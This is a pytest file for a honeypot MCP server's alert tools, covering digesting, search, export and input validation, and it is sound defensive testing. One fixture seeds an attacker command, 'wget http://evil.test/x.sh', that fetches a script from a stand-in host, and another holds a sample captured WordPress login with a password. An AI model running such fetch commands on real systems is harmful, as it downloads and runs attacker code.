"""Tests for the alert triage tools — the most-used surface of the server.

These tools return straight into a model's context window, so their response
*shape* is a correctness property, not a style preference: a triage call that
inlines full HTTP captures can consume the whole context in one turn. The
tests below pin the contract that list tools summarise and detail tools expand.
"""

import json
import os
from datetime import UTC, datetime, timedelta

import pytest

os.environ["DATABASE_URL"] = "sqlite+aiosqlite:///:memory:"


@pytest.fixture
def reports_dir(tmp_path, monkeypatch):
    """Point the artifact directory at a temp dir.

    Export tools confine writes to `reports_dir` (a security boundary — see
    tests/unit/test_security_boundaries.py), so tests must move the directory
    rather than write outside it.
    """
    from honeypot_mcp.config import get_settings

    monkeypatch.setattr(get_settings(), "reports_dir", tmp_path, raising=False)
    return tmp_path


@pytest.fixture(autouse=True)
async def setup_db():
    from honeypot_mcp.storage.database import close_db, init_db

    await init_db()
    yield
    await close_db()


async def _seed_alert(
    *,
    ip: str = "203.0.113.10",
    event_type: str = "http_probe",
    severity: str = "high",
    payload: dict | None = None,
    hours_ago: float = 0.1,
    honeypot_id: int | None = None,
) -> int:
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Alert, AlertSeverity

    ts = datetime.now(UTC) - timedelta(hours=hours_ago)
    async with get_session() as session:
        alert = Alert(
            honeypot_id=honeypot_id,
            source_ip=ip,
            source_port=44321,
            event_type=event_type,
            payload=payload if payload is not None else {},
            severity=AlertSeverity(severity),
            timestamp=ts,
        )
        session.add(alert)
        await session.flush()
        return alert.id


# A payload shaped like what the HTTP engine actually captures: a little
# high-signal data buried in a lot of bulk.
def _fat_http_payload() -> dict:
    return {
        "method": "POST",
        "path": "/wp-login.php",
        "username": "admin",
        "password": "hunter2",
        "exploit_categories": ["sqli"],
        "headers": {f"X-Filler-{i}": "A" * 200 for i in range(20)},
        "raw_body_b64": "QUFBQQ==" * 4000,
        "enrichment": {
            "geoip": {"country": "China", "as_org": "Chinanet", "latitude": 35.0},
            "virustotal": {"malicious": 12, "available": True},
        },
    }


# ── Response shaping ─────────────────────────────────────────────────────────


@pytest.mark.asyncio
async def test_alerts_recent_digests_instead_of_dumping_payload():
    """The regression that matters: a triage call must not inline the bulk
    capture. Digest keeps the credentials and verdict, drops headers/body."""
    from honeypot_mcp.tools.alerts import alerts_recent

    await _seed_alert(payload=_fat_http_payload())
    result = await alerts_recent()

    row = result["alerts"][0]
    assert "payload" not in row
    digest = row["digest"]
    # Signal survives.
    assert digest["username"] == "admin"
    assert digest["path"] == "/wp-login.php"
    assert digest["exploit_categories"] == ["sqli"]
    assert digest["country"] == "China"
    assert digest["vt_malicious"] == 12
    # Bulk does not.
    assert "headers" not in digest
    assert "raw_body_b64" not in digest
    # And the whole response stays small even though the payload is ~32 KB.
    assert len(json.dumps(result)) < 2000


@pytest.mark.asyncio
async def test_alerts_recent_include_payload_opts_into_full_capture():
    from honeypot_mcp.tools.alerts import alerts_recent

    await _seed_alert(payload=_fat_http_payload())
    result = await alerts_recent(include_payload=True)

    row = result["alerts"][0]
    assert "digest" not in row
    assert row["payload"]["headers"]  # bulk is present when asked for
    assert row["payload"]["username"] == "admin"


@pytest.mark.asyncio
async def test_oversized_values_are_clipped_with_a_marker():
    """Even the opt-in full payload clips a pathological single value, and says so."""
    from honeypot_mcp.tools.alerts import alerts_get

    alert_id = await _seed_alert(payload={"raw_body_b64": "X" * 50_000})
    result = await alerts_get(alert_id)

    body = result["payload"]["raw_body_b64"]
    assert len(body) < 50_000
    assert "chars" in body  # truncation marker explains what happened


@pytest.mark.asyncio
async def test_digest_is_omitted_for_empty_payload():
    from honeypot_mcp.tools.alerts import alerts_recent

    await _seed_alert(payload={})
    row = (await alerts_recent())["alerts"][0]
    assert "digest" not in row


@pytest.mark.asyncio
async def test_digest_surfaces_fields_from_engines_it_predates():
    """A new engine's payload keys must not be invisible just because the
    digest allow-list was written before that engine existed."""
    from honeypot_mcp.tools.alerts import alerts_recent

    await _seed_alert(payload={"some_future_engine_field": "important-value"})
    digest = (await alerts_recent())["alerts"][0]["digest"]
    assert digest["some_future_engine_field"] == "important-value"


# ── Time windows ─────────────────────────────────────────────────────────────


@pytest.mark.asyncio
async def test_alerts_recent_since_hours_filters_by_time():
    """'Anything critical in the last hour?' has to be expressible."""
    from honeypot_mcp.tools.alerts import alerts_recent

    await _seed_alert(ip="198.51.100.1", hours_ago=0.5)
    await _seed_alert(ip="198.51.100.2", hours_ago=48)

    recent = await alerts_recent(since_hours=1)
    ips = {a["source_ip"] for a in recent["alerts"]}
    assert ips == {"198.51.100.1"}
    assert "window" in recent

    everything = await alerts_recent()
    assert len(everything["alerts"]) == 2


@pytest.mark.asyncio
async def test_alerts_recent_rejects_nonpositive_window():
    from honeypot_mcp.tools.alerts import alerts_recent

    assert "error" in await alerts_recent(since_hours=0)
    assert "error" in await alerts_recent(since_hours=-5)


@pytest.mark.asyncio
async def test_alerts_recent_flags_truncation_at_limit():
    """Hitting the limit must be visible, or a caller reads a partial list as
    the complete picture."""
    from honeypot_mcp.tools.alerts import alerts_recent

    for i in range(5):
        await _seed_alert(ip=f"203.0.113.{i}")

    capped = await alerts_recent(limit=3)
    assert capped["count"] == 3
    assert "note" in capped

    uncapped = await alerts_recent(limit=50)
    assert "note" not in uncapped


@pytest.mark.asyncio
async def test_alerts_recent_unknown_honeypot_is_an_error():
    from honeypot_mcp.tools.alerts import alerts_recent

    result = await alerts_recent(honeypot_name="does-not-exist")
    assert "error" in result


@pytest.mark.asyncio
async def test_alerts_stats_reports_severity_breakdown_and_window():
    from honeypot_mcp.tools.alerts import alerts_stats

    await _seed_alert(severity="critical", hours_ago=0.5)
    await _seed_alert(severity="low", hours_ago=0.5)
    await _seed_alert(severity="low", hours_ago=72)

    windowed = await alerts_stats(since_hours=1)
    assert windowed["total_alerts"] == 2
    assert windowed["by_severity"] == {"critical": 1, "low": 1}

    lifetime = await alerts_stats()
    assert lifetime["total_alerts"] == 3
    assert lifetime["unique_source_ips"] == 1


# ── Search ───────────────────────────────────────────────────────────────────


@pytest.mark.asyncio
async def test_alerts_search_matches_inside_payloads():
    """The capability the old description failed to advertise: finding an
    alert by what the attacker actually sent."""
    from honeypot_mcp.tools.alerts import alerts_search

    await _seed_alert(payload={"command": "wget http://evil.test/x.sh"})
    await _seed_alert(payload={"command": "whoami"})

    result = await alerts_search("evil.test")
    assert result["count"] == 1
    assert "wget" in result["alerts"][0]["digest"]["command"]


@pytest.mark.asyncio
async def test_alerts_search_reports_no_matches_helpfully():
    from honeypot_mcp.tools.alerts import alerts_search

    result = await alerts_search("nothing-matches-this")
    assert result["count"] == 0
    assert "note" in result


# ── Export ───────────────────────────────────────────────────────────────────


@pytest.mark.asyncio
async def test_alerts_export_writes_a_file_and_returns_a_path(reports_dir):
    """Export must never return bulk content inline — a 5k-alert export of real
    HTTP capture is tens of megabytes."""
    from honeypot_mcp.tools.alerts import alerts_export

    await _seed_alert(payload=_fat_http_payload())
    dest = reports_dir / "out.json"

    result = await alerts_export(format="json", output_path="out.json")

    assert result["path"] == str(dest)
    assert result["alerts_exported"] == 1
    assert dest.exists()
    # The bulk lives on disk, not in the response.
    assert result["bytes"] > len(json.dumps(result["preview"]))
    written = json.loads(dest.read_text())
    assert "raw_body_b64" in written[0]["payload"]


@pytest.mark.asyncio
async def test_alerts_export_csv_has_a_header(reports_dir):
    from honeypot_mcp.tools.alerts import alerts_export

    await _seed_alert()
    dest = reports_dir / "out.csv"
    await alerts_export(format="csv", output_path="out.csv")

    assert dest.read_text().splitlines()[0].startswith("id,honeypot_id,source_ip")


@pytest.mark.asyncio
async def test_alerts_export_severity_filter(reports_dir):
    from honeypot_mcp.tools.alerts import alerts_export

    await _seed_alert(severity="critical")
    await _seed_alert(severity="low")

    result = await alerts_export(severity="critical", output_path="crit.json")
    assert result["alerts_exported"] == 1


# ── Input validation ─────────────────────────────────────────────────────────


@pytest.mark.asyncio
async def test_malformed_ip_is_rejected_not_silently_empty():
    """A typo'd IP previously returned 'no activity', which reads as a clean
    bill of health rather than a bad request."""
    from honeypot_mcp.tools.analysis import analyze_attacker, enrich_ip

    for bad in ("192.168.1", "not-an-ip", "999.999.999.999"):
        assert "error" in await enrich_ip(bad)
        assert "error" in await analyze_attacker(bad)


@pytest.mark.asyncio
async def test_valid_ips_pass_validation():
    from honeypot_mcp.tools._format import validate_ip

    assert validate_ip("8.8.8.8") is None
    assert validate_ip("2001:db8::1") is None
    assert validate_ip(" 8.8.8.8 ") is None  # tolerates copy-paste whitespace


@pytest.mark.asyncio
async def test_deploy_rejects_out_of_range_port():
    from honeypot_mcp.tools.honeypot import honeypot_deploy

    result = await honeypot_deploy(type="http", port=99999)
    assert "error" in result
    assert "65535" in result["error"]


@pytest.mark.asyncio
async def test_deploy_reports_port_conflict_by_name():
    """A port clash should name the honeypot holding it, not surface a bind
    error from inside the engine."""
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Honeypot, HoneypotStatus, HoneypotType
    from honeypot_mcp.tools.honeypot import honeypot_deploy

    async with get_session() as session:
        session.add(
            Honeypot(
                name="existing-web",
                type=HoneypotType.HTTP,
                port=8080,
                status=HoneypotStatus.RUNNING,
            )
        )

    result = await honeypot_deploy(type="http", port=8080, name="new-web")
    assert "error" in result
    assert "existing-web" in result["error"]
